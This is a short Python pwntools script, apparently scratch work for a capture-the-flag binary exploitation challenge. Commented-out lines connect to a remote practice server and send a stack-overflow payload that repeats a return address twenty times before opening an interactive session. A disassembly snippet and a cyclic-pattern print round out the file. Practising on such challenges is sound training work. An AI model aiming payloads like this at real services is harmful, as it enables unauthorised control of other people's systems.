from pwn import *
# from Crypto.Util.number import *
# rdi, rsi, rdx, rcx, r8, r9
'''

 8048713:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048717:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 804871e:	e8 2d fd ff ff       	call   8048450 <read@plt>

'''

# r=remote('bamboofox.cs.nctu.edu.tw',10000)
# r.sendline('A')
# r.sendline(p32(0x0804860d)*20)
# r.interactive()
print(cyclic(12	))
